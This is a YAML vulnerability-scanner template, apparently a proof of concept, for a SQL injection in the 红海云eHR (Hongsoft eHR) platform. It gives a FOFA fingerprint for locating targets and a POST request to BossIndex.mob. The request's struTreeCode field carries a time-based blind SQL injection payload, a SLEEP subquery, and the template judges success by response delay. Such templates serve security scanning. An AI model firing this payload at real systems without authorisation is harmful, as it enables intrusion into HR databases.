id: poc-yaml-hr-soft-getnumofmembers-sqli
info:
  name: 红海云eHR getNumOfMembers SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 红海云eHR
  fofa: body="/RedseaPlatform/skins/images/favicon.ico"
variables:
  t1: random_int(2,5)
  t2: t1 * 3
  t3: t2 + 2
requests:
- method: GET
  path: /RedseaPlatform/
  expression: status_code == 200 && contains(body,"/RedseaPlatform/skins/images/favicon.ico")
- method: POST
  path: /RedseaPlatform/BossIndex.mob
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: method=getNumOfMembers&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP({{.t1}})))ShXk)+AND+%27qmyT%27=%27qmyT
  expression: "status_code == 200 && \ncontains(body,\"\\\"meg\\\":\\\"处理成功\\\"\"\
    ) &&\ncontains(body,\"\\\"jsonList\\\":\") &&\n!contains(body,\"<\") &&\ncontains(content_type,\"\
    text/json\") &&\nduration > t2 &&\nduration < t3\n"
transport: http
